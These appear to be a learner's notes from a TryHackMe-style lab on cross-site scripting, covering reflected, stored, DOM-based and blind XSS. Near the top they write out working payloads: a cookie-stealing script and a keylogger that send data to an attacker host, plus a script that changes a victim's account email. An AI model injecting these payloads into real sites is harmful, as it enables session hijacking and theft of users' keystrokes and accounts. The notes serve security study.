
**XSS exploits**

POC: `<script>alert('XSS');</script>`


Session stealing (cookies):
`<script>fetch('https://hacker.thm/steal?cookie=' +btoa(document.cookie));</script>`

**Key Logger**:
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btao(e.key) );}</script>` 
- This acts as a key logger, makes anything that you type on the webpage be forwarded to a website that is under our control.

**Function exploits**

`<script>user.changeEmail('attacker@hacker.thm');</script>` 

***Reflected XSS****

- Happens when user-supplied data in an HTTP request is included in the webpage source without being validated.

![[Pasted image 20230301213516.png]]


**Test paramters in the URL  Query String and the URL file paths for XSS vulnerabilities**

***Stored XSS***

- Occurs when an XSS payload is stored on the web application and then gets ran when other users visit the web page.

![[Pasted image 20230301214040.png]]

Test for Stored XSS in:

![[Pasted image 20230301214401.png]]

***DOM Based XSS***

- DOM= Document Object Model = programming interface for HTML and XML documents

- allows changing of document structure, style, and content.![[Pasted image 20230301214800.png]]

- In DOM-Based XSS, execution happens directly in the browser without any new pages being loaded or any data being submitted to backend code. 

Ex: chat between two people enables sending of links.
	When the person clicks a link, a command will be executed on the clickers side, and the result of the command will be sent to the attackers side. 

***Blind XSS*** 

- Similar to stored XSS, but we can't see the payload working or be able to test it against ourself first. 

- For this reason, we need to make sure our payload has a callback (HTTP reqeust to our server) so that we know if and when our malicious code is being executed.

Tools: xsshunter


***Reflective XSS Exaple***

- ![[Pasted image 20230301220656.png]]

Will show you immediately the result of javascript after all tags are escaped or input is satisfied


***Exploiting Stored XSS***

![[Pasted image 20230301224056.png]]

this will load on the page automatically and send cookie data to my listener.

![[Pasted image 20230301224608.png]]

